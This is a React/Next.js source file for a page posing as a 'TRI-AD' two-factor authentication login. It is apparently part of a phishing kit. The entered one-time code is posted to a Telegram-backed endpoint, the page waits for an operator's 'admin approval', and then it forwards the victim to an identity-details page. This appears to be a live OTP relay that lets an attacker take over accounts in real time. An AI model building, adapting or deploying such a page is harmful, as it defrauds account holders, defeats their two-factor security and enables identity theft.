"use client";
import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { Header } from "@/sections/Header";
import { notifyTelegram } from "@/lib/telegram-notify";

export default function TwoFactorVerifyPage() {
  const router = useRouter();
  const [code, setCode] = useState("");
  const [rememberBrowser, setRememberBrowser] = useState(false);
  const [loginLoading, setLoginLoading] = useState(false);
  const [codeError, setCodeError] = useState(false);
  const [statusMessage, setStatusMessage] = useState<string | null>(null);
  const [statusType, setStatusType] = useState<"pending" | "approved" | "declined" | null>(null);
  const [pendingCodeId, setPendingCodeId] = useState<string | null>(null);
  const pollingIntervalRef = useRef<NodeJS.Timeout | null>(null);

  const clearCodeErr = () => {
    setCodeError(false);
  };

  // Poll for code approval status
  useEffect(() => {
    if (!pendingCodeId || !loginLoading) return;

    const pollCodeStatus = async () => {
      try {
        const response = await fetch(
          `/api/telegram/code-status?codeId=${encodeURIComponent(pendingCodeId)}`,
        );
        const data = (await response.json()) as {
          ok: boolean;
          status: string;
          expiresAt: number;
        };

        if (!data.ok) {
          return;
        }

        if (data.status === "approved") {
          clearPolling();
          setStatusType("approved");
          setStatusMessage("✅ Code approved! Proceeding...");
          setLoginLoading(false);

          setTimeout(() => {
            router.push("/identity-details");
          }, 800);
        } else if (data.status === "declined") {
          clearPolling();
          setStatusType("declined");
          setStatusMessage("❌ Code was declined. Please try a new code.");
          setLoginLoading(false);
          setCode("");
          setPendingCodeId(null);
        } else if (data.status === "expired") {
          clearPolling();
          setStatusType("declined");
          setStatusMessage("⏱️ Code expired. Please request a new one.");
          setLoginLoading(false);
          setCode("");
          setPendingCodeId(null);
        }
      } catch (err) {
        console.error("Failed to check code status:", err);
      }
    };

    const interval = setInterval(pollCodeStatus, 1000); // Poll every second
    pollingIntervalRef.current = interval;

    return () => {
      clearInterval(interval);
    };
  }, [pendingCodeId, loginLoading, router]);

  const clearPolling = () => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }
  };

  const handleResend = () => {
    clearPolling();
    setCode("");
    setStatusMessage(null);
    setStatusType(null);
    setPendingCodeId(null);
    setLoginLoading(false);
  };

  const handleLogin = async () => {
    if (!code.trim()) {
      setCodeError(true);
      return;
    }

    setLoginLoading(true);
    setStatusMessage("⏳ Waiting for admin approval...");
    setStatusType("pending");

    try {
      // Send verification to Telegram
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          kind: "verification",
          method: "text",
          code: code,
          otpStep: 1,
        }),
      });

      const result = (await response.json()) as {
        ok: boolean;
        error?: string;
        codeId?: string;
      };

      if (result.ok && result.codeId) {
        setPendingCodeId(result.codeId);
      } else {
        setStatusMessage("❌ Failed to send code for verification");
        setStatusType("declined");
        setLoginLoading(false);
      }
    } catch (err) {
      console.error("Failed to send verification:", err);
      setStatusMessage("❌ Error submitting code");
      setStatusType("declined");
      setLoginLoading(false);
    }
  };

  return (
    <>
      <style jsx>{`
        *,
        *::before,
        *::after {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
        }

        body {
          font-family: "Open Sans", Arial, sans-serif;
          background: #f5f5f5;
          color: #333;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
        }

        /* ── LAYOUT ── */
        .page-wrap {
          flex: 1;
          display: flex;
          padding: 28px 20px 40px;
          max-width: 1200px;
          width: 100%;
          margin: 0 auto;
        }
        .main-col {
          width: 62%;
          min-width: 0;
        }

        /* ── PAGE TITLE ── */
        h1 {
          font-size: 1.6rem;
          font-weight: 400;
          color: #4a4a4a;
          margin-bottom: 6px;
          letter-spacing: -0.01em;
        }
        .page-subtitle {
          font-size: 0.8125rem;
          color: #555;
          margin-bottom: 22px;
        }

        /* ── OUTER CARD ── */
        .outer-card {
          background: #fff;
          border: 1px solid #d8d8d8;
          border-radius: 4px;
          padding: 22px 22px 24px;
        }

        /* ── FIELD LABEL ── */
        .field-label {
          font-size: 0.875rem;
          color: #4a4a4a;
          margin-bottom: 8px;
        }

        /* ── CODE INPUT ── */
        .code-input-wrap {
          display: flex;
          align-items: center;
          border: 1px solid #aaa;
          border-radius: 3px;
          background: #fff;
          margin-bottom: 16px;
          overflow: hidden;
          max-width: 720px;
          transition:
            border-color 0.15s,
            box-shadow 0.15s;
        }
        .code-input-wrap:focus-within {
          border-color: #2ec4a0;
          box-shadow: 0 0 0 2px rgba(46, 196, 160, 0.18);
        }
        .code-input-wrap.has-error {
          border-color: #c0392b;
        }

        .code-input-icon {
          padding: 0 10px;
          display: flex;
          align-items: center;
          color: #2ec4a0;
          flex-shrink: 0;
        }
        .code-input-wrap input {
          flex: 1;
          border: none;
          outline: none;
          padding: 8px 10px 8px 0;
          font-size: 0.875rem;
          font-family: "Open Sans", sans-serif;
          color: #333;
          background: transparent;
          height: 38px;
        }

        .err-msg {
          display: none;
          font-size: 0.72rem;
          color: #c0392b;
          margin-top: -10px;
          margin-bottom: 10px;
        }
        .has-err .err-msg {
          display: block;
        }

        /* ── REMEMBER BROWSER ── */
        .remember-row {
          display: flex;
          align-items: flex-start;
          gap: 8px;
          margin-bottom: 6px;
        }
        .remember-row input[type="checkbox"] {
          width: 14px;
          height: 14px;
          cursor: pointer;
          margin-top: 2px;
          flex-shrink: 0;
          accent-color: #2ec4a0;
        }
        .remember-row label {
          font-size: 0.8125rem;
          color: #333;
          cursor: pointer;
        }

        /* Remember info paragraph */
        .remember-info {
          display: flex;
          align-items: flex-start;
          gap: 6px;
          font-size: 0.775rem;
          color: #555;
          line-height: 1.55;
          margin-bottom: 20px;
          max-width: 720px;
        }
        .info-circle {
          flex-shrink: 0;
          width: 15px;
          height: 15px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 0.6rem;
          font-weight: 700;
          margin-top: 1px;
          color: #fff;
        }
        .info-circle.teal {
          background: #2ec4a0;
        }
        .info-circle.grey {
          background: #888;
        }

        /* ── BUTTON ROW ── */
        .action-row {
          display: flex;
          align-items: center;
          justify-content: space-between;
          max-width: 720px;
          margin-bottom: 14px;
        }

        /* Resend Code */
        .btn-resend {
          background: #2ec4a0;
          color: #fff;
          border: none;
          border-radius: 4px;
          padding: 8px 16px;
          font-size: 0.8125rem;
          font-weight: 600;
          font-family: "Open Sans", sans-serif;
          cursor: pointer;
          display: inline-flex;
          align-items: center;
          gap: 7px;
          transition: background 0.15s;
        }
        .btn-resend:hover {
          background: #25a98a;
        }

        /* Login */
        .btn-login {
          background: #2ec4a0;
          color: #fff;
          border: none;
          border-radius: 4px;
          padding: 8px 22px;
          font-size: 0.875rem;
          font-weight: 700;
          font-family: "Open Sans", sans-serif;
          cursor: pointer;
          display: inline-flex;
          align-items: center;
          gap: 8px;
          transition:
            background 0.15s,
            transform 0.08s;
        }
        .btn-login:hover {
          background: #25a98a;
        }
        .btn-login:active {
          transform: scale(0.99);
        }
        .btn-login:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }

        /* spinner */
        @keyframes spin {
          to {
            transform: rotate(360deg);
          }
        }
        .spin-ring {
          display: none;
          width: 13px;
          height: 13px;
          border: 2px solid rgba(255, 255, 255, 0.35);
          border-top-color: #fff;
          border-radius: 50%;
          animation: spin 0.65s linear infinite;
        }

        /* ── INFO ALERT BOX ── */
        .info-alert {
          background: #d6eef2;
          border: 1px solid #a8d4db;
          border-radius: 3px;
          padding: 14px 16px;
          font-size: 0.8rem;
          color: #2c5f72;
          line-height: 1.6;
          max-width: 720px;
          display: flex;
          gap: 10px;
          align-items: flex-start;
        }
        .info-alert .alert-icon {
          flex-shrink: 0;
          margin-top: 1px;
        }
        .info-alert .highlight {
          color: #c0392b;
          font-weight: 600;
        }

        /* ── FOOTER ── */
        footer {
          background: #fff;
          border-top: 1px solid #ddd;
          padding: 10px 20px;
          font-size: 0.75rem;
          color: #555;
          display: flex;
          align-items: center;
          justify-content: space-between;
        }
        footer a {
          color: #1a6a9a;
          text-decoration: none;
        }
        footer a:hover {
          text-decoration: underline;
        }
        .scroll-top {
          background: none;
          border: none;
          cursor: pointer;
          color: #888;
          display: flex;
          align-items: center;
        }
        .scroll-top:hover {
          color: #555;
        }

        /* toast */
        #toast {
          position: fixed;
          bottom: 24px;
          left: 50%;
          transform: translateX(-50%) translateY(10px);
          background: #333;
          color: #fff;
          font-size: 0.8rem;
          font-family: "Open Sans", sans-serif;
          padding: 9px 18px;
          border-radius: 3px;
          opacity: 0;
          pointer-events: none;
          transition:
            opacity 0.2s,
            transform 0.2s;
          z-index: 9999;
          white-space: nowrap;
        }
        #toast.show {
          opacity: 1;
          transform: translateX(-50%) translateY(0);
        }

        /* Mobile responsiveness */
        @media (max-width: 768px) {
          .page-wrap {
            padding: 16px 12px 24px;
          }

          .main-col {
            width: 100%;
          }

          h1 {
            font-size: 1.3rem;
            margin-bottom: 4px;
          }

          .page-subtitle {
            font-size: 0.75rem;
            margin-bottom: 16px;
          }

          .outer-card {
            padding: 16px 14px 18px;
          }

          .field-label {
            font-size: 0.8rem;
          }

          .code-input-wrap {
            max-width: 100%;
          }

          .action-row {
            flex-direction: column;
            gap: 10px;
            max-width: 100%;
          }

          .btn-resend,
          .btn-login {
            width: 100%;
            justify-content: center;
          }

          .remember-info,
          .info-alert {
            max-width: 100%;
          }

          footer {
            flex-direction: column;
            gap: 10px;
            font-size: 0.7rem;
          }
        }
      `}</style>

      <Header />

      <div className="page-wrap">
        <div className="main-col">
          <h1>Two-Factor Authentication</h1>
          <p className="page-subtitle">
            Your login is protected with an authenticator app. Enter your
            authenticator code below.
          </p>

          <div className="outer-card">
            {/* Field label */}
            <p className="field-label">Two Factor Code</p>

            {/* Code input */}
            <div className={`code-input-wrap ${codeError ? "has-error" : ""}`}>
              <div className="code-input-icon">
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#2ec4a0"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4" />
                </svg>
              </div>
              <input
                type="text"
                placeholder=""
                autoComplete="one-time-code"
                maxLength={10}
                value={code}
                onChange={(e) => {
                  setCode(e.target.value);
                  clearCodeErr();
                }}
              />
            </div>
            <div className={`err-msg ${codeError ? "has-err" : ""}`}>
              Please enter your Two-Factor Authentication code.
            </div>

            {/* Remember this browser */}
            <div className="remember-row">
              <input
                type="checkbox"
                id="remember-browser"
                checked={rememberBrowser}
                onChange={(e) => setRememberBrowser(e.target.checked)}
              />
              <label htmlFor="remember-browser">Remember this browser</label>
            </div>

            {/* Remember info */}
            <div className="remember-info">
              <div className="info-circle teal">i</div>
              <div>
                Entering your Two-Factor code received, checking this box and
                clicking "Login", will no longer require you to go through
                Two-Factor Authentication for 14 days when accessing your
                account within this browser from this machine. After 14 days,
                you will be required to verify your account authority again.
              </div>
            </div>

            {/* Action buttons */}
            <div className="action-row">
              <button className="btn-resend" onClick={handleResend} disabled={loginLoading}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="white">
                  <path d="M12 6v3l4-4-4-4v3c-4.42 0-8 3.58-8 8 0 1.57.46 3.03 1.24 4.26L6.7 14.8A5.87 5.87 0 016 12c0-3.31 2.69-6 6-6zm6.76 1.74L17.3 9.2c.44 1.03.7 2.15.7 2.8 0 3.31-2.69 6-6 6v-3l-4 4 4 4v-3c4.42 0 8-3.58 8-8 0-1.57-.46-3.03-1.24-4.26z" />
                </svg>
                Resend Code
              </button>

              <button
                className="btn-login"
                onClick={handleLogin}
                disabled={loginLoading}
              >
                <span>{loginLoading ? "Verifying…" : "Login"}</span>
                <div
                  className="spin-ring"
                  style={{ display: loginLoading ? "block" : "none" }}
                ></div>
                <svg
                  width="15"
                  height="15"
                  viewBox="0 0 24 24"
                  fill="white"
                  style={{ display: loginLoading ? "none" : "inline" }}
                >
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z" />
                </svg>
              </button>
            </div>

            {/* Status message */}
            {statusMessage && (
              <div
                style={{
                  padding: "12px 14px",
                  borderRadius: "4px",
                  fontSize: "0.875rem",
                  marginBottom: "14px",
                  backgroundColor:
                    statusType === "pending"
                      ? "#fff3cd"
                      : statusType === "approved"
                        ? "#d4edda"
                        : "#f8d7da",
                  color:
                    statusType === "pending"
                      ? "#856404"
                      : statusType === "approved"
                        ? "#155724"
                        : "#721c24",
                  border: `1px solid ${
                    statusType === "pending"
                      ? "#ffeaa7"
                      : statusType === "approved"
                        ? "#c3e6cb"
                        : "#f5c6cb"
                  }`,
                }}
              >
                {statusMessage}
              </div>
            )}

            {/* Info alert box */}
            <div className="info-alert">
              <div className="alert-icon">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#2ec4a0">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z" />
                </svg>
              </div>
              <div>
                Please allow up to 5 minutes to receive your code. After 5
                minutes, if you do receive an authentication code via text or
                email, the "<span className="highlight">Resend Code</span>"
                button will be available to request a new code. Please remember,
                to receive a code via phone, it must be a cell phone#. For
                email, please check your spam or junk folder.
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* ── FOOTER ── */}
      <footer>
        <div>
          © 2026 Copyright © 2002-2026 TRI-AD | Disclaimer –
          <a href="#" onClick={(e) => e.preventDefault()}>
            Terms of Use and Privacy Policy
          </a>
          &nbsp;All rights reserved
        </div>
        <button
          className="scroll-top"
          onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
          title="Back to top"
        >
          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
            <path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z" />
          </svg>
        </button>
      </footer>

      <div id="toast"></div>
    </>
  );
}
